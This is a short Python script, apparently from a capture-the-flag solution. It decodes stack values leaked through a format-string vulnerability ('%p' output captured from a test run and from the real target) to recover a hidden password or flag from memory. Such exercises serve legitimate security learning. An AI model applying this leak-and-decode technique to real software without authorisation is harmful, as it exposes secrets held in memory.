output_test = "0x7fffffffe4e0 (nil) 0x25 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6d8 0x1f7ff9a08 0x7025207025207025 0x2520702520702520 0x2070252070 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x6867666564636261 0x706f6e6d6c6b6a69 0x7877767574737271 0x4645444342417a79 0x4e4d4c4b4a494847 (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070  does not have access!"
output_real = "0x7fffffffe500 (nil) 0x25 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6f8 0x1f7ff9a08 0x7025207025207025 0x2520702520702520 0x2070252070 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070"

def decode(output):
    arr = output.split()[21:26]

    flag = ''
    for str in arr:
        if str.startswith("0x"):
            flag = flag + bytes.fromhex(str[2:]).decode('utf8')[::-1]

    return flag

print(decode(output_test)) # Output: abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMN
print(decode(output_real))
